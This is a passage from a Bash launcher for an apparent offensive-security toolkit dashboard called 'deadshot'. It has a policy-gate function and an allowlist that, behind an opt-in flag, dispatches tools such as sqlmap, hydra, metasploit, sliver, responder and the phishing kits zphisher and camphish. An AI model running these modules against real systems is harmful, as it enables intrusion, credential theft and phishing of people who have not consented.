            fi
        fi
    fi

    local bypass_cmds="run_shield run_requisitos run_agent_sentinel \
        run_agent_operator run_agent_runtime run_agent_arbiter \
        run_ai_assistant"

    for bypass in $bypass_cmds; do
        [[ "$cmd" == "$bypass" ]] && return 0
    done

    local action_id="action.module.${cmd}"
    local agent_bin="$SCRIPT_DIR/deadshot_agents"
    local agent_script="$SCRIPT_DIR/deadshot_agents.py"
    local result

    if [[ -x "$agent_bin" ]]; then
        if [[ "${EUID:-0}" -eq 0 ]]; then
            result=$(timeout 5 "$agent_bin" arbiter \
                --check "$action_id" --approve no --json 2>/dev/null)
        else
            result=$(timeout 5 sudo "$agent_bin" arbiter \
                --check "$action_id" --approve no --json 2>/dev/null)
        fi
    elif [[ -f "$agent_script" ]]; then
        result=$(timeout 5 python3 "$agent_script" arbiter \
            --check "$action_id" --approve no --json 2>/dev/null)
    else
        if [[ "${DEADSHOT_PROD_MODE:-0}" == "1" ]]; then
            echo -e "${RED}[!] POLICY GATE: Agent engine unavailable. PROD_MODE=1 — blocking ${cmd}.${NC}"
            return 1
        else
            echo -e "${DARK_GRAY}[!] WARNING: Agent engine unavailable. Lab mode — allowing ${cmd} without policy check.${NC}"
            return 0
        fi
    fi

    local allowed
    allowed=$(echo "$result" | python3 -c \
        "import sys,json; d=json.load(sys.stdin); \
        print('yes' if d.get('check',{}).get('allowed') else 'no')" 2>/dev/null)

    if [[ "$allowed" != "yes" ]]; then
        local reason
        reason=$(echo "$result" | python3 -c \
            "import sys,json; d=json.load(sys.stdin); \
            print(d.get('check',{}).get('reason','denied by policy'))" 2>/dev/null)
        echo -e "${RED}[!] POLICY GATE DENIED: ${cmd} — ${reason:-denied by policy}${NC}"
        return 1
    fi

    return 0
}
is_allowed_dispatch_command() {
    if is_enabled "${DEADSHOT_ENABLE_OFFENSIVE_MODULES:-0}"; then
        case "$1" in
            run_ai_assistant|run_live_intel|run_agent_sentinel|run_agent_operator|run_agent_runtime|run_agent_arbiter|run_amass|run_theharvester|run_phoneinfoga|run_sherlock|run_sqlmap|run_nuclei|run_nikto|run_wpscan|run_rustscan|run_hydra|run_ffuf|run_netexec|run_sliver|run_metasploit|run_peas_server|run_responder|run_wifite|run_hashcat|run_zphisher|run_camphish|run_seeker|run_torproxy|run_shield|run_requisitos|clean_tools_dir)
                return 0
                ;;
            *)
                return 1
                ;;
        esac
    fi

    case "$1" in
        run_agent_sentinel|run_agent_operator|run_agent_runtime|run_agent_arbiter|run_shield)
            return 0
            ;;
        *)
            return 1
            ;;
    esac
}

if [ -n "$1" ]; then
    # Function directly called by the Python Dashboard
    if ! is_allowed_dispatch_command "$1" || ! declare -F "$1" >/dev/null 2>&1; then
        echo -e "${RED}[!] Invalid or unauthorized command: $1${NC}"
        exit 1
    fi
    if ! engine_policy_gate "$1"; then
        exit 1
    fi
    "$1" "${@:2}"
    exit $?
fi

# Initializing the Master Dashboard
init_virtualenv
if ! python3 -c "import textual" &>/dev/null; then
    clear
    echo -e "${RED}[!] Dependência em falta: python package 'textual'.${NC}"
    exit 1
fi

if is_enabled "$ENABLE_PREMIUM_LOADING"; then
    premium_boot_loading
    export DEADSHOT_SKIP_UI_BOOT=1
else
    unset DEADSHOT_SKIP_UI_BOOT
fi

export DEADSHOT_PROJECT_DISPLAY_NAME="$PROJECT_DISPLAY_NAME"
export DEADSHOT_PROJECT_CONSOLE_NAME="$PROJECT_CONSOLE_NAME"
export DEADSHOT_PROJECT_MOTTO="$PROJECT_MOTTO"
export DEADSHOT_ENGINE_NAME="$(basename "$0")"
export DEADSHOT_ENABLE_OFFENSIVE_MODULES="${DEADSHOT_ENABLE_OFFENSIVE_MODULES:-0}"

export DEADSHOT_OPSEC=1 # Ensure child processes bypass OPSEC reset latency
if [ -x "$SCRIPT_DIR/deadshot_ui" ]; then
    "$SCRIPT_DIR/deadshot_ui"
else
    if [ -f "$SCRIPT_DIR/deadshot_ui.py" ]; then
        python3 "$SCRIPT_DIR/deadshot_ui.py"
    else
        python3 "$SCRIPT_DIR/deadshot_ui.pyc"
    fi
fi
clean_exit
